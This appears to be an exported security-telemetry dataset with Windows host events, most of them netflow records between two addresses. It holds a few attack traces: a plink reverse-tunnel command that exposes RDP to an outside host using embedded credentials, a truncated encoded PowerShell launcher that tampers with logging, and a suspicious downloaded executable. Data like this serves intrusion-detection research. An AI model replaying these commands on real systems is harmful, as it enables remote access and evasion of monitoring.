1deb1396-40e9-418c-a994-8f373e964c0d,{'netflow': '142.20.57.246:53359->202.6.172.98:443'},828749
727f0ddf-9731-479d-9826-05f9ba17a500,{'netflow': '202.6.172.98:443->142.20.57.246:49938'},804173
6b13ece4-99eb-44ae-b30c-709199c00af6,{'netflow': '202.6.172.98:443->142.20.57.246:53358'},828752
b10b2be1-6189-4cb6-ad37-5823dccb1321,{'netflow': '142.20.57.246:53360->202.6.172.98:443'},828753
bb54ffe4-3eb6-4e1d-9524-76aa48eb4440,{'netflow': '202.6.172.98:443->142.20.57.246:53359'},828754
f9d8778a-890f-47ab-93b2-2d598cbbfc90,{'netflow': '202.6.172.98:443->142.20.57.246:53904'},847184
99f58c0a-4914-40e4-8ab1-881c5cf95c9c,{'netflow': '202.6.172.98:443->142.20.57.246:53360'},828759
5dcbba22-815c-42a3-8373-0db70b57852f,{'netflow': '142.20.57.246:53361->202.6.172.98:443'},828766
c058da3e-4b1c-4770-8555-920ea5199557,{'netflow': '142.20.57.246:53362->202.6.172.98:443'},828769
624538cd-0a22-4a4f-aa0f-3fefeba66192,{'netflow': '202.6.172.98:443->142.20.57.246:53361'},828772
43eb41b9-8394-477a-8bf9-8cbb321ad733,{'netflow': '142.20.57.246:53363->202.6.172.98:443'},828773
b7046cbd-027d-435b-bab3-8dc9c7c15f76,{'netflow': '142.20.57.246:53278->202.6.172.98:443'},822634
eaf951bb-0d48-43b1-9f9d-da71e15df956,{'netflow': '142.20.57.246:49992->202.6.172.98:443'},808299
dffb4aae-42a5-4104-9f36-ea3666bab4d0,{'netflow': '142.20.57.246:53337->202.6.172.98:443'},826732
12849d06-f461-4af8-8954-fcf1c65a1eee,{'netflow': '142.20.57.246:53366->202.6.172.98:443'},828780
9e3dce2b-fbd0-4dfd-a268-0fb71b200986,{'netflow': '142.20.57.246:53679->202.6.172.98:443'},843118
f6006ae7-289e-4eb8-9beb-027dc560c7ac,{'netflow': '202.6.172.98:443->142.20.57.246:53362'},828785
d8723dec-6c26-4593-a2ac-791bfaf078af,{'netflow': '202.6.172.98:443->142.20.57.246:53363'},828786
b18d5056-634e-4fb7-852f-6170bfe4a517,{'netflow': '142.20.57.246:53988->202.6.172.98:443'},857462
3c5c592a-bf53-4a06-99da-db1345565e5e,{'subject': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe C:/Windows/System32/mobsync.exe -Embedding'},5495
ea07fd25-cbc9-4782-9977-e3da934a776e,{'netflow': '202.6.172.98:443->142.20.57.246:53366'},828792
790d99a7-e96f-4f94-bce5-80af6132c21c,{'netflow': '202.6.172.98:443->142.20.57.246:53988'},857466
dd3390dc-8c77-4360-ae52-b8eccd26c36f,{'netflow': '142.20.57.246:53338->202.6.172.98:443'},826749
8d910946-5d6a-46af-991e-7b99597e1305,{'netflow': '202.6.172.98:443->142.20.57.246:49992'},808318
0a04bae2-e67d-4445-8668-7855d115df2b,{'netflow': '142.20.57.246:49951->202.6.172.98:443'},804226
ed3466bf-58b5-4a06-a6df-a28803be51e8,{'netflow': '142.20.57.246:53302->202.6.172.98:443'},824708
5893d4bd-d0a6-428e-93b3-bd453ce17823,{'netflow': '142.20.57.246:53934->202.6.172.98:443'},851333
65548ebb-ce87-402f-92c2-529bb8ecea2e,{'netflow': '142.20.57.246:53921->202.6.172.98:443'},849284
cdcf7a8d-22e8-4df1-9659-214eb06c41dc,{'netflow': '202.6.172.98:443->142.20.57.246:53337'},826759
1137e622-a962-4c8a-81ea-4d1cca30c6cf,{'netflow': '202.6.172.98:443->142.20.57.246:53934'},851336
0948bff9-9927-4cae-b6de-57fd7fe88e5e,{'netflow': '202.6.172.98:443->142.20.57.246:49951'},804230
098137ec-54a0-4ead-a088-d6e83d042fcc,{'netflow': '142.20.57.246:53455->202.6.172.98:443'},837002
6759c684-eae0-495c-ba97-3e0527acb242,{'netflow': '142.20.57.246:49977->202.6.172.98:443'},806298
7d8d9b5f-25b3-4888-8d63-29d12b60ce38,{'netflow': '142.20.57.246:53999->202.6.172.98:443'},859548
86d01cee-78bf-4888-aa3c-76864341c951,{'netflow': '202.6.172.98:443->142.20.57.246:53302'},824733
cd4ce82a-4dcb-4f45-ab82-6cb76561e75a,{'netflow': '202.6.172.98:443->142.20.57.246:53278'},822692
d505558a-5113-44cc-b01e-47813f9a2b3a,{'netflow': '202.6.172.98:443->142.20.57.246:53999'},859565
0a6e8f8f-942e-47e1-b9f7-183ab382a45e,{'netflow': '202.6.172.98:443->142.20.57.246:53338'},826799
5056e286-d26a-4bfe-b234-bcd3c3a91bf1,{'netflow': '142.20.57.246:53279->202.6.172.98:443'},822708
9ccd343b-cf4d-4bdd-abd8-c6dd228d4c2f,{'netflow': '142.20.57.246:53989->202.6.172.98:443'},857526
3317e8ce-8f59-4100-89a7-48365a1f7df6,"{'subject': '/Device/HarddiskVolume1/Windows/system32/plink.exe ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest'}",5560
3772b611-e09c-4472-b81d-2b294b98ede5,{'netflow': '202.6.172.98:443->142.20.57.246:53279'},822713
2df7c66f-42bc-4653-bad9-0ffc958e23fe,{'netflow': '142.20.57.246:53384->202.6.172.98:443'},830907
b594372e-0e67-419f-ae6a-7619caa026a6,{'netflow': '142.20.57.246:53385->202.6.172.98:443'},830908
b0902567-08f5-41fc-a29d-20c7b09e968a,{'netflow': '202.6.172.98:443->142.20.57.246:53989'},857532
dd26eb11-65e5-41d1-98dd-928190863673,{'netflow': '202.6.172.98:443->142.20.57.246:53384'},830909
dd8dd76b-3389-4d40-95c4-a1cd269891c7,{'netflow': '202.6.172.98:443->142.20.57.246:53385'},830910
3b764bd9-ad50-428a-9f8a-35f6311057dc,{'netflow': '142.20.57.246:53439->202.6.172.98:443'},835009
7b0795e5-3099-42fc-876d-501bda735b54,{'netflow': '142.20.57.246:54064->202.6.172.98:443'},861638
a34b8847-4687-4d4c-85c0-21a48234deea,{'netflow': '142.20.57.246:53479->202.6.172.98:443'},839113
5cbd0ff8-a37e-45cf-bfa7-32cca56c6d2e,{'netflow': '202.6.172.98:443->142.20.57.246:53479'},839120
ec0ec3a4-1982-4126-aec7-d82621ccfce1,{'netflow': '142.20.57.246:54065->202.6.172.98:22'},861652
24004199-4ebd-4041-9714-12c6609d45c2,{'netflow': '142.20.57.246:53428->202.6.172.98:443'},832984
a4f8397f-ce98-4ef6-ae7a-1d75cefc8e26,{'netflow': '202.6.172.98:443->142.20.57.246:53921'},849371
379dd8af-6184-4990-8028-17a8a3fc180b,{'netflow': '202.6.172.98:443->142.20.57.246:53679'},843228
1b78d632-e3e6-46bc-ac41-04fc5eca1cdb,{'netflow': '142.20.57.246:53480->202.6.172.98:443'},839133
696746c1-d42c-4037-a273-9ae9f4071d52,{'netflow': '142.20.57.246:49993->202.6.172.98:443'},808421
008e4d96-4354-4315-a71a-74024e9e5df2,{'netflow': '202.6.172.98:443->142.20.57.246:53455'},837094
f331fd7f-83e8-46d9-a0dd-6ffe18aaaff3,{'netflow': '142.20.57.246:53911->202.6.172.98:443'},847334
63d71f5a-a0cb-44d7-8a10-ba021d3ea466,{'netflow': '202.6.172.98:443->142.20.57.246:49977'},806385
c10664bb-bdcb-43fc-b789-5631a93cef5b,{'netflow': '142.20.57.246:53491->202.6.172.98:443'},841201
ad9e6771-d865-4777-bbda-26c949ca5914,{'netflow': '202.6.172.98:443->142.20.57.246:53439'},835059
6918e982-8518-455b-bf62-f0545ff51223,{'subject': 'System None'},3570
91dc35cb-f509-4ea9-8cbd-4de5d2e62e6b,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe /SystemRoot/System32/smss.exe'},3569
48ff772b-9d7a-4d68-b74e-86e7a4a3242d,{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe None'},3576
7ee09540-06e8-4e5f-ac54-949c34743517,{'netflow': '142.20.57.246:53881->202.6.172.98:443'},845309
c6f34b3d-1982-4852-b9b6-c90ca546e7a5,{'netflow': '202.6.172.98:443->142.20.57.246:53480'},839170
6044291a-425e-4ae5-a39e-425a81a468d9,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe None'},3586
570f0df4-73e8-486d-9b4f-39e4d0aa4ef8,{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe None'},3587
832a1376-197a-415b-b4d9-cb2cbd753763,{'netflow': '142.20.57.246:50125->202.6.172.98:443'},812550
66cc25a8-2044-4754-9eb2-22068150e797,{'netflow': '142.20.57.246:54000->202.6.172.98:443'},859654
81b592b1-21f5-49d0-97d1-4f2bedfd88de,{'netflow': '142.20.57.246:50126->202.6.172.98:443'},812551
a9db395b-a607-4da5-900b-74d19de94407,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe C:/Windows/System32/svchost.exe -k utcsvc'},3594
b35f80d7-25ae-4bc1-a020-78dea3c85c63,{'netflow': '202.6.172.98:443->142.20.57.246:50125'},812555
2e0faadf-8f78-455e-9add-6b28f29850af,{'netflow': '202.6.172.98:443->142.20.57.246:50126'},812556
d7491c2b-82d9-47d3-bcda-f4bc03f720f8,{'netflow': '202.6.172.98:443->142.20.57.246:54000'},859662
a35052e0-7a67-4617-81e8-75533cff577a,{'netflow': '202.6.172.98:443->142.20.57.246:53428'},833041
72225268-a850-4413-a4bc-0592e2f61344,{'netflow': '142.20.57.246:53943->202.6.172.98:443'},853522
429232e5-6a83-4051-9985-32ea421f19ec,"{'subject': '%SystemRoot%/system32/csrss.exe %SystemRoot%/system32/csrss.exe ObjectDirectory=/Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16'}",5650
d63c1192-9ccb-4b2c-913f-22f7c5b03d30,{'netflow': '142.20.57.246:53304->202.6.172.98:443'},824854
afb688ea-7298-44da-bcbd-23d60c4643aa,{'netflow': '202.6.172.98:443->142.20.57.246:53943'},853533
427c5d12-01ed-4c79-b631-cd54f53db256,{'netflow': '142.20.57.246:53961->202.6.172.98:443'},855583
c0e29714-5b17-4cf6-99a2-d82a35da6d36,{'subject': '/Device/HarddiskVolume1/Windows/system32/SearchProtocolHost.exe None'},5665
4990633f-4bcf-4ac0-b6a1-6ba6c2d7352e,{'netflow': '202.6.172.98:443->142.20.57.246:53881'},845358
847d09d8-a4e8-4be8-95ef-aaade0782ac2,{'netflow': '202.6.172.98:443->142.20.57.246:53911'},847407
04718ec1-0510-44bb-8ca3-7eaffa9f384a,{'netflow': '142.20.57.246:53935->202.6.172.98:443'},851512
53f39396-f687-48b4-a4cf-42d00d5b6edf,{'netflow': '142.20.57.246:53922->202.6.172.98:443'},849466
acdbee39-aa42-4a94-92f0-e3c4c7e8fdb0,{'netflow': '142.20.57.246:53367->202.6.172.98:443'},828989
1cecf607-ff7b-4f1b-9f3a-1f5dcd9b494a,{'netflow': '142.20.57.246:53339->202.6.172.98:443'},826942
903f520d-4abd-4fd7-b5e8-566f7c63ee81,{'netflow': '202.6.172.98:443->142.20.57.246:53367'},828992
ad283fd5-af13-4cae-976d-5ea94d121a78,{'netflow': '142.20.57.246:53368->202.6.172.98:443'},828993
2bac8b6d-8335-48e4-8811-f8a811bc23c9,{'netflow': '142.20.57.246:53369->202.6.172.98:443'},828994
ea31c2f7-1cf2-4b29-8c98-1b71808510ac,{'netflow': '202.6.172.98:443->142.20.57.246:53304'},824899
0b21c4c2-58dc-4ad5-b7bb-2b55f59dff42,{'netflow': '202.6.172.98:443->142.20.57.246:53935'},851524
fcff2b85-7660-4c6b-b99f-0e3f0121ee01,{'netflow': '202.6.172.98:443->142.20.57.246:54064'},861767
adecf527-035e-4828-9e2d-860faba8dde3,{'netflow': '202.6.172.98:22->142.20.57.246:54065'},861768
c9f7d6b4-f269-4596-8523-ac750177cf32,{'netflow': '202.6.172.98:443->142.20.57.246:53368'},828999
157535a9-33b5-47eb-b3a4-3e078d87cd54,{'netflow': '202.6.172.98:443->142.20.57.246:53491'},841291
37908885-40aa-4a21-a0ff-3aea592f000c,{'netflow': '142.20.57.246:53440->202.6.172.98:443'},835148
a8e1af84-0eed-4487-82cb-3a55f4f70392,{'netflow': '202.6.172.98:443->142.20.57.246:53440'},835149
5e0349f1-8402-4761-9bc8-4bc32d83cfa3,{'netflow': '202.6.172.98:443->142.20.57.246:49993'},808528
ea91d766-22ed-459b-bf15-b5f807b47409,{'netflow': '142.20.57.246:53280->202.6.172.98:443'},822866
ab2309f9-d567-446f-9d9b-7d81c7d5d199,{'netflow': '202.6.172.98:443->142.20.57.246:53280'},822877
42aa340a-c0b3-4723-aec0-95d2126f0a36,{'netflow': '142.20.57.246:50006->202.6.172.98:443'},810590
7bb40a6b-52bc-44be-b1f2-d4c6e4bbf46a,{'netflow': '142.20.57.246:49958->202.6.172.98:443'},804446
5853dbd8-2adf-468f-b275-3ed5e2e92fee,{'netflow': '142.20.57.246:53944->202.6.172.98:443'},853603
4455be06-ee44-4a79-bc11-256e3f72a4fa,{'netflow': '202.6.172.98:443->142.20.57.246:53961'},855652
b1587d8f-0e1b-479e-bce7-2737fc509e23,{'netflow': '202.6.172.98:443->142.20.57.246:53944'},853605
fdb482c9-5338-47b6-ac00-e5d7227c1a70,{'netflow': '142.20.57.246:53990->202.6.172.98:443'},857701
1b6a9bfb-f741-4117-8ec3-8cf064e7294e,{'netflow': '142.20.57.246:50007->202.6.172.98:443'},810595
7c360e51-97ad-4fdf-b627-bd761cc8399f,{'netflow': '202.6.172.98:443->142.20.57.246:53990'},857706
b3708918-71bc-4c9e-adff-76e093552da7,{'netflow': '202.6.172.98:443->142.20.57.246:50006'},810604
0013f57d-321e-4d79-b788-976d44e3006e,{'netflow': '202.6.172.98:443->142.20.57.246:50007'},810605
d8380b63-698d-4c94-a64e-c7faf28732a5,{'netflow': '142.20.57.246:50128->202.6.172.98:443'},812662
89dae5ad-f1e8-4a26-a60b-77251a6b5d20,{'netflow': '142.20.57.246:50129->202.6.172.98:443'},812663
ebb01ed9-1302-4af1-8c4c-22312d6468ec,{'netflow': '142.20.57.246:53281->202.6.172.98:443'},822904
d741f163-d0b3-40f0-89a0-bbc904c42901,{'netflow': '142.20.57.246:53340->202.6.172.98:443'},827001
917db26d-0ad4-4f68-ad76-1c7e3d063bb5,{'netflow': '142.20.57.246:49978->202.6.172.98:443'},806524
78360c9b-f891-4c2f-8a2c-9ff9783f48ad,{'netflow': '142.20.57.246:53936->202.6.172.98:443'},851581
3237926c-44bf-48f6-ba77-e4591b6c4d52,{'netflow': '142.20.57.246:50008->202.6.172.98:443'},810622
b5148b27-371f-401d-8421-7ae72079b7ee,{'netflow': '202.6.172.98:443->142.20.57.246:53936'},851582
6f3954ed-d1cd-43ba-ad32-b59408cb76b2,{'netflow': '142.20.57.246:50009->202.6.172.98:443'},810623
834c7fcb-9099-4406-bea6-ae8822255136,{'netflow': '202.6.172.98:443->142.20.57.246:53339'},827008
9eee5def-e5a5-42ee-a045-808ed70ad4af,{'netflow': '202.6.172.98:443->142.20.57.246:50129'},812672
3b8b25f9-4566-4214-98e2-6059b42a0917,{'netflow': '202.6.172.98:443->142.20.57.246:53281'},822913
33c00aff-509a-4e30-a662-336696844353,{'netflow': '202.6.172.98:443->142.20.57.246:53481'},839298
aa1d206c-e401-45fd-a3fc-08a9dd7b4285,{'netflow': '202.6.172.98:443->142.20.57.246:50128'},812673
cdee0997-359a-4db8-bbe6-118fbe92a96d,{'netflow': '142.20.57.246:53884->202.6.172.98:443'},845445
bb936ea1-4a0f-424a-8d9b-890665ce63eb,{'netflow': '142.20.57.246:53481->202.6.172.98:443'},839297
559e9806-2aa1-47e2-a180-68298a91a946,{'netflow': '202.6.172.98:443->142.20.57.246:50008'},810631
f79ec1eb-64b4-4dbe-9176-0e9426e0220c,{'netflow': '202.6.172.98:443->142.20.57.246:49978'},806530
4acd096a-a2f8-483f-a11f-175932fe8e93,{'netflow': '142.20.57.246:53429->202.6.172.98:443'},833164
08d711a9-ab76-4035-a1d4-e91f3be546b6,{'subject': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe None'},5773
0e0e08e5-dc27-4460-a3a5-41105a7c4db8,{'netflow': '202.6.172.98:443->142.20.57.246:53369'},829086
4be52b0c-6e01-4bc4-b27f-5c7ef1e1fdac,{'netflow': '202.6.172.98:443->142.20.57.246:53429'},833186
37537783-4b0e-4aaf-9a07-4b4b30624b0a,{'netflow': '142.20.57.246:49994->202.6.172.98:443'},808611
5fdbe8cf-807f-4f73-bbc6-b09d5356c185,{'netflow': '202.6.172.98:443->142.20.57.246:53340'},827043
412bda08-1aa2-4374-be9d-8e6ae231daa9,{'netflow': '142.20.57.246:53370->202.6.172.98:443'},829101
c8d10386-379c-4bff-bd04-61ae0003da85,{'netflow': '142.20.57.246:53371->202.6.172.98:443'},829102
801d727e-4ad1-4516-9bf6-b41cc1dbdea9,{'netflow': '202.6.172.98:443->142.20.57.246:49994'},808627
c9e0238a-1cdf-4a5e-9ab6-cbfea0bd8c4a,"{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"'}",3770
91cf6eed-6ee7-43aa-a2d0-62e81ca89e2e,"{'subject': '/Device/HarddiskVolume1/Windows/system32/lsass.exe ""C:/Program Files (x86)/Microsoft Office/Office15/WINWORD.EXE"" /n ""C:/Users/bantonio/AppData/Local/Microsoft/Windows/INetCache/Content.Outlook/H777GZPT/payroll.docx"" /o """"'}",3771
3c7b52b8-f6b4-45b5-9632-4a857197fd61,{'netflow': '202.6.172.98:443->142.20.57.246:53390'},831169
8f610c63-d117-4c64-8412-ced8aa6b30d0,{'netflow': '202.6.172.98:443->142.20.57.246:50009'},810692
f5552091-0e7f-4d76-bcd7-6fdb8c6ce778,{'netflow': '142.20.57.246:53390->202.6.172.98:443'},831173
53a7fc38-8fe7-4ec1-a608-0ea117b8dd47,{'netflow': '202.6.172.98:443->142.20.57.246:53884'},845510
1d6d84c7-695b-4f9d-b2ed-bd26e5d1bfcc,{'netflow': '142.20.57.246:54001->202.6.172.98:443'},859847
283cbadc-58f9-40f8-b743-4e72039b32bb,{'netflow': '142.20.57.246:53945->202.6.172.98:443'},853703
d41d6558-a4ff-4d15-a772-767095a9f86d,{'netflow': '202.6.172.98:443->142.20.57.246:49958'},804554
72d1d7c6-dae4-42af-b726-3da605f73c0e,{'netflow': '142.20.57.246:53991->202.6.172.98:443'},857803
76216d35-1375-4957-958d-16c97b049fdc,{'netflow': '142.20.57.246:53914->202.6.172.98:443'},847567
d514b613-d5c8-4377-9ff9-2dbeee33c00d,{'netflow': '202.6.172.98:443->142.20.57.246:54001'},859856
ac94a091-609f-467e-8392-de1c73bc73d2,{'netflow': '202.6.172.98:443->142.20.57.246:53991'},857810
2ea61a98-febd-49ec-9c47-81a31884b0c0,{'netflow': '142.20.57.246:53482->202.6.172.98:443'},839383
8ee15ca0-1964-416c-9862-2e89d843186f,{'netflow': '142.20.57.246:49964->202.6.172.98:443'},804567
6c9cc27c-6fb2-4411-b69f-8d918b950b7a,{'netflow': '142.20.57.246:53441->202.6.172.98:443'},835289
1c205927-e71f-47ed-84a7-5a4ea9f86264,{'netflow': '142.20.57.246:53305->202.6.172.98:443'},825050
01bc0dc5-3dd6-4297-8a0a-2b8be2703f32,{'netflow': '142.20.57.246:53306->202.6.172.98:443'},825051
a1e82a8c-13fb-4be9-8c52-5ec82895e9a7,{'netflow': '202.6.172.98:443->142.20.57.246:53482'},839388
7d8c6ab8-8ddb-4164-a0a7-f66eb91bbb74,{'netflow': '202.6.172.98:443->142.20.57.246:53305'},825058
0979f91f-2641-4bf2-a4c2-d462b2a650d7,{'netflow': '202.6.172.98:443->142.20.57.246:53306'},825059
3c241579-d454-47e6-9165-ed0bf144d90b,{'netflow': '142.20.57.246:51163->202.6.172.98:443'},814821
5fc70892-70f0-4383-9028-57439e79d21a,{'netflow': '202.6.172.98:443->142.20.57.246:53441'},835304
a205ebce-d02a-47b5-8fad-691ff8d32f29,{'netflow': '202.6.172.98:443->142.20.57.246:53922'},849643
054df7d9-801e-49d0-b8cd-4f20b42a4305,{'subject': '/Device/HarddiskVolume1/Windows/System32/WindowsPowerShell/v1.0/powershell.exe None'},3820
f202fb64-9a1a-4e45-930c-6c10266aab59,{'netflow': '142.20.57.246:53492->202.6.172.98:443'},841453
98f5435f-b4c8-420d-af01-d3b530805cad,{'netflow': '142.20.57.246:53430->202.6.172.98:443'},833262
55016343-af49-4fdd-9714-194a0bd8ae76,{'netflow': '142.20.57.246:50130->202.6.172.98:443'},812783
ca664460-47c5-40f0-ab95-e7f98b54a566,{'netflow': '202.6.172.98:443->142.20.57.246:50130'},812784
4524e03f-6ea7-47a3-84f2-84016d53dab8,"{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe""'}",5880
946b9e95-68be-4003-ae5b-9a45ffafcdf1,{'netflow': '142.20.57.246:53962->202.6.172.98:443'},855801
7a7ed319-25c7-4fd9-87c3-c1891ea6bb35,{'netflow': '202.6.172.98:443->142.20.57.246:53945'},853754
1a4bfafc-54e7-432d-9bdd-9edf33150e79,{'netflow': '142.20.57.246:50136->202.6.172.98:443'},812793
daec9d1f-b6ad-4250-84c5-99f0156349e5,"{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe ""C:/Users/sysadmin/Downloads/fileTransfer1000.exe"" --help'}",5881
60c6a2ba-fe79-4d5e-853f-8d4dd57f0faa,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5883
2a7d5baa-002d-4708-a8e6-e259e64bc00b,{'netflow': '202.6.172.98:443->142.20.57.246:50136'},812799
47d9c284-eb47-4aea-a264-e3920cae7f30,{'netflow': '142.20.57.246:53946->202.6.172.98:443'},853762
6cc3d0bd-4c0a-4ef1-ad78-2819c7a9930c,{'netflow': '202.6.172.98:443->142.20.57.246:53946'},853763
185264a8-6bbc-41c9-8f75-8454fdcc44ef,{'netflow': '202.6.172.98:443->142.20.57.246:49964'},804625
fae98e00-589c-4e36-a2b6-116dda93abfc,{'netflow': '202.6.172.98:443->142.20.57.246:53914'},847636
f27952da-f8b7-4447-bdc2-ee086d205721,{'netflow': '142.20.57.246:51149->202.6.172.98:443'},814870
98e71d27-952a-4353-bd00-88a1d1f9101e,{'netflow': '202.6.172.98:443->142.20.57.246:53492'},841494
9001a320-1e78-4742-af73-e32c42cf3cf9,{'file': '/Device/HarddiskVolume1/Windows/system32/plink.exe'},89883
1298e1db-2fe8-4947-a75c-ac715840c729,{'netflow': '142.20.57.246:49980->202.6.172.98:443'},806690
3551dcff-0d4f-45a8-b5ad-5315abc1f408,{'netflow': '142.20.57.246:49969->202.6.172.98:443'},804644
8dec7284-b38b-4622-b4e0-4f89b0195e25,{'netflow': '202.6.172.98:443->142.20.57.246:53430'},833317
36e36edb-7bc2-40aa-b7ca-7ce12e69a9a3,{'netflow': '142.20.57.246:49995->202.6.172.98:443'},808755
0a27ecf7-604a-430f-91ef-e5b4ab3b7838,{'netflow': '202.6.172.98:443->142.20.57.246:49995'},808760
0d299ce5-0ce3-4321-9883-f16fe34de77a,{'netflow': '142.20.57.246:53947->202.6.172.98:443'},853819
3fe64796-b205-4058-b68e-189cb0d3ef17,{'netflow': '202.6.172.98:443->142.20.57.246:53947'},853822
49a7973d-31bb-4574-9e74-a70454f62acf,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5956
5f469a02-2687-4c78-b5cb-df733f3f661c,{'netflow': '202.6.172.98:443->142.20.57.246:53962'},855884
f7622acd-5f97-4b79-8713-853a861de0c3,{'netflow': '142.20.57.246:54002->202.6.172.98:443'},859980
0a5884dc-a64b-4850-be65-421b2f6b773a,{'netflow': '142.20.57.246:53798->202.6.172.98:443'},843601
fddb42aa-3109-42da-ab73-351dafc700df,{'netflow': '202.6.172.98:443->142.20.57.246:53370'},829266
02395f37-2853-4b1e-854b-ee60e5e458a9,{'netflow': '202.6.172.98:443->142.20.57.246:53371'},829267
7933d10b-2cd6-4eaa-983c-263ecb6ea7c0,{'netflow': '142.20.57.246:53993->202.6.172.98:443'},857938
c8853dee-9084-4862-a6a6-94d6d8d5f449,{'netflow': '142.20.57.246:53373->202.6.172.98:443'},829269
4c8da503-a5e3-40b6-b8f2-bfe03467f240,{'netflow': '142.20.57.246:53341->202.6.172.98:443'},827222
7b2a1fac-fa74-437b-a43a-147fd0f786a1,{'netflow': '202.6.172.98:443->142.20.57.246:54002'},859990
f7f45c8a-5b49-4f86-9c3f-8b3de11559ac,{'netflow': '142.20.57.246:53372->202.6.172.98:443'},829268
7ef24c01-dbda-42d4-ae6a-af018eff3cba,{'netflow': '142.20.57.246:53456->202.6.172.98:443'},837465
4198a4d8-ab84-4ca1-926a-50a94c76471a,{'netflow': '142.20.57.246:53309->202.6.172.98:443'},825178
381d9f06-205b-4373-8803-9805573619aa,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},5970
29733f9f-bd8d-4b68-bec4-e595638770c8,{'netflow': '202.6.172.98:443->142.20.57.246:53309'},825185
c7fef3f6-3ac7-4a24-9239-673435b7b393,{'netflow': '142.20.57.246:53442->202.6.172.98:443'},835429
9b982a36-0db7-4beb-9043-e0cd4286d68f,{'netflow': '142.20.57.246:53483->202.6.172.98:443'},839529
6f332007-2676-41cb-9461-6d60bf2b3f08,{'netflow': '142.20.57.246:53948->202.6.172.98:443'},853873
ad844212-0c75-40f6-bad7-cf7546e35d87,{'netflow': '142.20.57.246:53374->202.6.172.98:443'},829298
619d6d77-cd87-4fea-b4c1-594788bbd011,{'netflow': '142.20.57.246:53885->202.6.172.98:443'},845683
3d273314-76e8-4858-90a5-71dd7f6a2588,{'netflow': '202.6.172.98:443->142.20.57.246:53948'},853874
03fb6007-9fa8-4ce9-8a3b-5d25cba807a7,{'netflow': '202.6.172.98:443->142.20.57.246:53456'},837498
8a349cc7-6a84-42b6-be0e-bf758834cea0,{'netflow': '202.6.172.98:443->142.20.57.246:53993'},857981
2ce1ffbf-fad6-4e27-a3c1-2f23698c514e,{'netflow': '142.20.57.246:53915->202.6.172.98:443'},847741
884473a5-c865-47c4-9cbb-d7bf1d8ccbd2,{'netflow': '142.20.57.246:53937->202.6.172.98:443'},851847
072062cb-4329-403a-844e-72a70d9ac6a0,{'netflow': '202.6.172.98:443->142.20.57.246:53798'},843656
45a2d390-245f-4bf1-97f9-dd9422ed8cce,{'file': '/Device/HarddiskVolume1/windows/system32/mobsync.exe'},79751
c176a339-c0b7-41f1-98f5-87ec4acd7e79,{'netflow': '202.6.172.98:443->142.20.57.246:53442'},835466
ac67918f-cd3a-4a83-b14f-7ff779255471,{'netflow': '142.20.57.246:53282->202.6.172.98:443'},823180
e519a49c-b940-41ca-b570-8fc4568779f6,{'netflow': '202.6.172.98:443->142.20.57.246:53483'},839566
3faba69a-8c4f-4ae4-b292-54c374a6533e,{'subject': 'powershell.exe C:/Windows/System32/WindowsPowershell/v1.0/powershell -NoProfile -Sta -WindowStyle 1 -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAQgBsAEUALgBQAFMAVgBFAHIAUwBJAG8AbgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUATQBiAGwAeQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwB'},3986
276f0283-fe2b-41cc-b9c7-b9912b21b7f4,{'netflow': '202.6.172.98:443->142.20.57.246:53885'},845716
b6f1489e-839f-4b12-b97d-6bb5b3caafae,{'netflow': '202.6.172.98:443->142.20.57.246:49980'},806806
262151aa-40e1-48a2-b98b-9c92aae4e7d1,{'netflow': '202.6.172.98:443->142.20.57.246:53392'},831383
fc9feb4a-14cc-4a2d-ba93-27dbe5c390dc,{'netflow': '202.6.172.98:443->142.20.57.246:49969'},804765
ae8be5bc-0b48-4c8b-a59b-225221f6a6c9,{'netflow': '142.20.57.246:53392->202.6.172.98:443'},831389
281edc04-1ee7-4f6c-b274-cdc16b30da87,{'subject': 'powershell.exe None'},4002
9ffae81a-3c51-40b1-9789-b19c1980a755,{'subject': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/fileTransfer1000.exe None'},6053
97190465-6df3-4923-a534-2ef6571fa299,{'netflow': '202.6.172.98:443->142.20.57.246:53372'},829353
d7c1b8ca-b9c5-4ddd-a5f7-b6eb91ccb73d,{'netflow': '202.6.172.98:443->142.20.57.246:53373'},829354
92f601d0-66a2-4bce-a928-1277d3d276dc,{'netflow': '202.6.172.98:443->142.20.57.246:53282'},823211
5931cc4c-cf2a-4918-8ddd-8bc705673b48,{'netflow': '142.20.57.246:53432->202.6.172.98:443'},833452
dc5c5a17-6f3e-49a8-b0ee-5b063676db1d,{'netflow': '202.6.172.98:443->142.20.57.246:53915'},847791
